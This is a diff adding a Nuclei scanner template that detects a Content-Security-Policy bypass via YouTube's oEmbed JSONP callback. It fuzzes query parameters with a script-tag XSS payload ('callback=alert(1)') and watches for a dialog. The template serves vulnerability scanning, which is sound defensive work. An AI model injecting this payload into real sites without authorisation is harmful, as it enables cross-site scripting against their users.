@@ -1,0 +1,55 @@
+id: youtube-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - YouTube API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,youtube-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "youtube.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: youtube_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "youtube_api_csp_xss == true"
+# digest: 4a0a00473045022100b09bd32ffb433f938c8241de7752ea1a3a65f4e64b6e37996cdff2a76189a5cd022027a324cd04c1b627a16334954c6ae17d826e8b81fb0736c9f3fb60ef570cb824:922c64590222798bb761d5b6d8e72950
